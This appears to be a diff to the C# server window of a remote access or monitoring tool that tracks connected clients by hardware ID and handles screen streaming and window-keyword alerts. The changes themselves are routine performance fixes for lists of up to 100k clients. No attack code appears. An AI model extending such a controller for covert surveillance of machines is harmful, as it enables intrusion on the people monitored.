@@ -579,7 +579,8 @@ public partial class ServerWindow : ThemedWindow
         if (_server == null || WinNotifyEnabled.IsChecked != true) return;
         var clients = _server.ConnectedClients.Keys.ToList();
         if (clients.Count > 0)
-            _ = Task.Run(async () => { foreach (var id in clients) await SendWindowNotifyKeywords(id); });
+            _ = Task.Run(() => Parallel.ForEachAsync(clients, new ParallelOptions { MaxDegreeOfParallelism = 50 },
+                async (id, _) => await SendWindowNotifyKeywords(id)));
     }
 
     private async void HandleWindowNotifyAlert(string clientId, WindowNotifyAlertData data)
@@ -1099,7 +1100,7 @@ public partial class ServerWindow : ThemedWindow
                 if (_store.AllClients.TryGetValue(c.Hwid, out var rec)) rec.LiveClient = c;
             }
             _onlineClients.AddRange(toAdd.Values);
-            System.Windows.Data.CollectionViewSource.GetDefaultView(_onlineClients)?.Refresh();
+            // AddRange already fires a Reset which re-applies the filter — no Refresh() needed.
         }
 
         // Close feature windows + remove screen tiles for disconnected clients
@@ -1156,11 +1157,8 @@ public partial class ServerWindow : ThemedWindow
         if (toAdd.Count > 0)
         {
             foreach (var c in toAdd)
-            {
                 _onlineById[c.Id] = c;
-                _onlineClients.Add(c);
-            }
-            System.Windows.Data.CollectionViewSource.GetDefaultView(_onlineClients)?.Refresh();
+            _onlineClients.AddRange(toAdd); // one Reset instead of N individual Add events
         }
     }
 
@@ -1419,7 +1417,11 @@ public partial class ServerWindow : ThemedWindow
         {
             _clientsDirty = false;
             RefreshClients();
-            RefreshAllClients();
+            // Only rebuild All Clients grid when that tab is visible — at 100k records the
+            // O(n log n) sort + full ObservableCollection rebuild is too expensive to run
+            // on every dashboard tick. Tab-switch handler calls RefreshAllClients() on demand.
+            if (MainTabControl.SelectedIndex == 2)
+                RefreshAllClients();
         }
         if (_autoTasksDirty) { _autoTasksDirty = false; GridAutoTasks.Items.Refresh(); }
     }
@@ -5794,6 +5796,10 @@ Read-Host 'Press Enter to close'
         // Auto-stop screen streaming when navigating away from the Screen tab
         if (!ReferenceEquals(ti, ScreenTabItem) && _screenTimer != null)
             ScreenStop_Click(this, null!);
+
+        // Refresh All Clients grid on demand when navigating to that tab
+        if (MainTabControl.SelectedIndex == 2)
+            RefreshAllClients();
 
         // Re-run tile sizing when switching to Screen tab — viewport may have changed
         // while a different tab was active (SizeChanged fires with stale size on hidden tabs).
